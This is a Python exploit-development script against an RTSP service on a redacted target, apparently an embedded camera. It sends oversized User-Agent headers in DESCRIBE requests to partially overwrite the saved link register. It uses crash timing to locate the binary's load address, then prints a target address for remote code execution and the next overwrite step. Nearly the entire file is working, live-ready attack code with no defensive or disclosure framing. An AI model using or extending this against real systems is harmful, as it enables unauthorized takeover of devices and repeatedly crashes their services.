#!/usr/bin/env python3
"""
rtsp_lr_region.py — Find RTSP binary load address via partial LR overwrite.

CONFIRMED from rtsp_partial_overwrite.py:
  - 1-byte partial overwrite (249 bytes) → ALL byte values give HIT (>4s)
  - This proves the binary IS mapped and executable at original LR's address
  - Full 4-byte tests (0x8000, 0x10000, etc.) gave FAST = wrong addresses

This script uses 3-byte overwrite (251 bytes) to find LR[2] (3rd byte of LR).

With payload = A×248 + 0x00 + 0x00 + b2 (251 bytes):
  - LR[0] = 0x00 (overwritten)
  - LR[1] = 0x00 (overwritten)
  - LR[2] = b2   (overwritten) ← this is what we sweep
  - LR[3] = intact from stack (almost certainly 0x00 for user-space < 256MB)

New LR = (b2 << 16)  → sweeps: 0x00000000, 0x00010000, ..., 0x00FF0000

FAST (<4s) = b2 outside binary → SIGSEGV (unmapped or NX)
HIT (>4s)  = b2 within binary → code executes

The range of b2 values that give HIT tells us the binary's load address and size!

Phase A: Coarse sweep b2 = 0x00..0xFF step 0x04 (every 256KB)
Phase B: Fine sweep within identified region (step 0x01)

Usage: python3 -u rtsp_lr_region.py > /tmp/lr_region_out.txt 2>&1
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=60, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2: print(f"  [✓] RTSP alive ({label}) — waited {e:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead {max_wait}s ({label})", flush=True)
    return False

def probe(ua_payload, poll_timeout=15, label=""):
    """Returns (elapsed, 'FAST'|'HIT'|'DEAD')"""
    if not wait_rtsp(60, "pre"):
        return None, "SKIP"
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + ua_payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.3)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "FAST" if t < 4 else "HIT"
                print(f"  [★] {label}  T+{t:.1f}s [{tag}]", flush=True)
                return t, tag
        except: pass
    # If no restart in poll_timeout — still likely HIT (just long-running code)
    t = time.time() - t0
    print(f"  [?] {label}  T+{t:.0f}s [HIT-LONG]", flush=True)
    return t, "HIT"


print("=" * 70)
print("Phase A: 3-byte coarse sweep — find binary's 256KB region")
print(f"  payload = A×{PC_OFFSET} + \\x00 + \\x00 + b2  (251 bytes)")
print(f"  New LR = (b2 << 16)  [LR[3] = 0x00 stays intact from stack]")
print(f"  FAST = outside binary, HIT = inside binary")
print("=" * 70)

wait_rtsp(120, "start")

phase_a_hits = []
phase_a_results = {}

# Coarse sweep: b2 from 0x00 to 0xFF, step 0x04 (every 256KB boundary)
for b2 in range(0x00, 0x100, 0x04):
    addr = b2 << 16
    payload = b'A' * PC_OFFSET + bytes([0x00, 0x00, b2])  # 251 bytes
    t, tag = probe(payload, poll_timeout=15, label=f"b2=0x{b2:02X} addr=0x{addr:08X}")
    phase_a_results[b2] = (t, tag)
    print(f"  b2=0x{b2:02X} (0x{addr:08X})  t={t:.1f}s  {tag}", flush=True)
    if tag == "HIT":
        phase_a_hits.append(b2)
        print(f"  *** HIT at 0x{addr:08X}! binary is in this 256KB region ***", flush=True)
    wait_rtsp(30, f"after 0x{b2:02X}")

print()
print("=" * 70)
print(f"Phase A summary: HIT b2 values = {[hex(x) for x in phase_a_hits]}")
if phase_a_hits:
    min_b2 = min(phase_a_hits)
    max_b2 = max(phase_a_hits)
    print(f"  Binary spans approximately 0x{min_b2<<16:08X} – 0x{(max_b2+4)<<16:08X}")
    print(f"  Estimated size: ~{(max_b2-min_b2+4)*65536:,} bytes")
print("=" * 70)

if not phase_a_hits:
    print("  No HITs found in Phase A!")
    print("  Possible causes:")
    print("  1. LR[3] is NOT 0x00 (binary at address > 0x01000000)")
    print("  2. ASLR is active (different address each run)")
    print("  3. PC_OFFSET is not exactly 248 (might have shifted)")
    print()
    print("  Trying with 4-byte payloads — sweeping b3 too (LR[3]=b3)...")
    for b3 in [0x00, 0x40, 0x80, 0xBF, 0x7F, 0x20]:
        for b2 in [0x00, 0x08, 0x10, 0x20, 0x40]:
            addr = (b3 << 24) | (b2 << 16)
            payload = b'A' * PC_OFFSET + bytes([0x00, 0x00, b2, b3])  # 252 bytes
            t, tag = probe(payload, poll_timeout=15, label=f"4B 0x{addr:08X}")
            print(f"  0x{addr:08X}  t={t:.1f}s  {tag}", flush=True)
            if tag == "HIT":
                print(f"  *** HIT at 0x{addr:08X}! ***", flush=True)
            wait_rtsp(30, f"after 0x{addr:08X}")
    sys.exit(0)

# ─── Phase B: Fine sweep within HIT region ────────────────────────────────────
print()
print("=" * 70)
print("Phase B: Fine sweep — exact load address (step 0x01 = 64KB precision)")
print(f"  Sweeping b2 from 0x{max(0,min_b2-2):02X} to 0x{min(0xFF,max_b2+6):02X} step 0x01")
print("=" * 70)

phase_b_hits = []
b2_range_lo = max(0, min_b2 - 2)
b2_range_hi = min(0xFF, max_b2 + 6)

for b2 in range(b2_range_lo, b2_range_hi + 1):
    addr = b2 << 16
    payload = b'A' * PC_OFFSET + bytes([0x00, 0x00, b2])
    t, tag = probe(payload, poll_timeout=15, label=f"fine b2=0x{b2:02X} addr=0x{addr:08X}")
    print(f"  b2=0x{b2:02X} (0x{addr:08X})  t={t:.1f}s  {tag}", flush=True)
    if tag == "HIT":
        phase_b_hits.append(b2)
    wait_rtsp(30, f"after fine 0x{b2:02X}")

print()
print("=" * 70)
print("Phase B results:")
if phase_b_hits:
    lo = min(phase_b_hits)
    hi = max(phase_b_hits)
    binary_base = lo << 16
    binary_end  = (hi + 1) << 16
    print(f"  BINARY LOAD RANGE: 0x{binary_base:08X} – 0x{binary_end:08X}")
    print(f"  Binary size (approx): {binary_end - binary_base:,} bytes = {(binary_end - binary_base)//1024}KB")
    print()
    print(f"  TARGET ADDRESS for RCE: 0x{binary_base + 0x100:08X}")
    print(f"  (= binary base + 0x100, should be in .text section)")
    print()
    print("  Next step: full 4-byte overwrite with address in this range!")
    print(f"  python3 -c \"import struct; print(struct.pack('<I', 0x{binary_base+0x200:08X}).hex())\"")
else:
    print("  No HITs in Phase B. Something is wrong.")

print()
print("Done.")
